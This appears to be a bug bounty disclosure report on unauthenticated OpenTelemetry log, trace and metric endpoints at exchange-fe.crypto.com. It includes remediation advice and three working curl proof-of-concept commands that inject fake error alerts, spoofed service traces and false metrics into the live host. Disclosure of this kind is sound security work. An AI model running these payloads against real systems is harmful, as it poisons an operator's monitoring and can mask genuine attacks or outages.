# HackerOne Report — Unauthenticated OpenTelemetry Injection on exchange-fe.crypto.com

**Program:** Crypto.com Bug Bounty (https://hackerone.com/crypto)
**Severity:** Medium
**CWE:** CWE-306 (Missing Authentication for Critical Function)
**Date:** 2026-04-10

---

## Summary

Three OpenTelemetry (OTLP/JSON) ingestion endpoints on `exchange-fe.crypto.com` accept arbitrary log, metric, and trace data from any unauthenticated source on the internet. An attacker can inject fabricated events into the exchange's observability pipeline — including false error alerts, fake distributed traces, and synthetic metrics — with no credentials required.

---

## Affected Endpoints

| Endpoint | Method | Auth Required | Response |
|----------|--------|---------------|----------|
| `https://exchange-fe.crypto.com/public/otel/v1/logs`    | POST | None | `HTTP 201 {"code":0}` |
| `https://exchange-fe.crypto.com/public/otel/v1/metrics` | POST | None | `HTTP 201 {"code":0}` |
| `https://exchange-fe.crypto.com/public/otel/v1/traces`  | POST | None | `HTTP 201 {"code":0}` |

All three are within the `*.crypto.com` in-scope wildcard.

---

## Proof of Concept

### Log injection

```bash
curl -X POST "https://exchange-fe.crypto.com/public/otel/v1/logs" \
  -H "Content-Type: application/json" \
  -d '{
    "resourceLogs": [{
      "resource": {
        "attributes": [
          {"key": "service.name",           "value": {"stringValue": "exchange-core"}},
          {"key": "deployment.environment", "value": {"stringValue": "production"}}
        ]
      },
      "scopeLogs": [{
        "logRecords": [{
          "severityNumber": 17,
          "severityText": "ERROR",
          "body": {"stringValue": "CRITICAL: Withdrawal service unresponsive — injected by researcher"},
          "attributes": [
            {"key": "error.type", "value": {"stringValue": "ServiceUnavailable"}}
          ]
        }]
      }]
    }]
  }'
```

**Response:** `HTTP 201` `{"code":0}`

### Trace injection (distributed trace poisoning)

```bash
curl -X POST "https://exchange-fe.crypto.com/public/otel/v1/traces" \
  -H "Content-Type: application/json" \
  -d '{
    "resourceSpans": [{
      "resource": {
        "attributes": [
          {"key": "service.name", "value": {"stringValue": "order-matching-engine"}}
        ]
      },
      "scopeSpans": [{
        "spans": [{
          "traceId": "deadbeefdeadbeefdeadbeefdeadbeef",
          "spanId":  "cafebabecafebabe",
          "name": "processWithdrawal",
          "kind": 2,
          "startTimeUnixNano": "1712800000000000000",
          "endTimeUnixNano":   "1712800005000000000",
          "status": {"code": 2, "message": "Internal error — injected"}
        }]
      }]
    }]
  }'
```

**Response:** `HTTP 201` `{"code":0}`

### Metric injection

```bash
curl -X POST "https://exchange-fe.crypto.com/public/otel/v1/metrics" \
  -H "Content-Type: application/json" \
  -d '{
    "resourceMetrics": [{
      "resource": {
        "attributes": [
          {"key": "service.name", "value": {"stringValue": "exchange-core"}}
        ]
      },
      "scopeMetrics": [{
        "metrics": [{
          "name": "orders.processed",
          "gauge": {
            "dataPoints": [{
              "asDouble": 0,
              "timeUnixNano": "1712800000000000000"
            }]
          }
        }]
      }]
    }]
  }'
```

**Response:** `HTTP 201` `{"code":0}`

---

## Impact

**Observability poisoning** — an attacker controlling the telemetry pipeline can:

1. **Alert fatigue** — flood on-call with thousands of fake `CRITICAL` / `ERROR` level log events, causing engineers to dismiss genuine alerts.

2. **Incident response confusion** — inject false distributed traces into real incidents, leading engineers to investigate non-existent components or service calls.

3. **Mask real attacks** — during an active exploit, inject "all healthy" telemetry to suppress anomaly detection dashboards.

4. **Fabricate SLO/SLA data** — inject synthetic metrics that show normal latency/throughput while real degradation is hidden.

5. **Impersonate internal services** — any `service.name` can be spoofed (e.g., `order-matching-engine`, `withdrawal-service`, `auth-service`), making injected data indistinguishable from legitimate telemetry without source verification.

The `/public/` path prefix suggests this was intentionally exposed for browser Real User Monitoring (RUM) — collecting frontend telemetry from user browsers. However, without rate limiting, origin validation, or any form of authentication/token verification, the same endpoints are trivially abusable at scale.

---

## Root Cause

The OTLP/JSON endpoints are exposed under `/public/` with no:
- Authentication (no API key, no session cookie, no Bearer token)
- Rate limiting (no 429 responses observed at low volume)
- Source/origin validation (no CORS restriction on POST)
- Schema validation that would reject obviously-fabricated service names

---

## Recommended Remediation

1. **Token-based ingestion auth** — require a per-session or per-deployment write token (e.g., a short-lived JWT issued at app initialization) for all OTLP ingestion. The token can be injected into the SPA at load time without being hardcoded.

2. **Rate limiting** — apply per-IP rate limits to all `/public/otel/*` endpoints (e.g., 100 req/min).

3. **Schema/allowlist validation** — reject `service.name` values not in a known allowlist of legitimate frontend service identifiers.

4. **Separate RUM from backend telemetry** — if these endpoints are intended only for browser RUM, ensure backend/infrastructure service names cannot be spoofed (i.e., enforce an allowlist of valid frontend-only service identifiers).
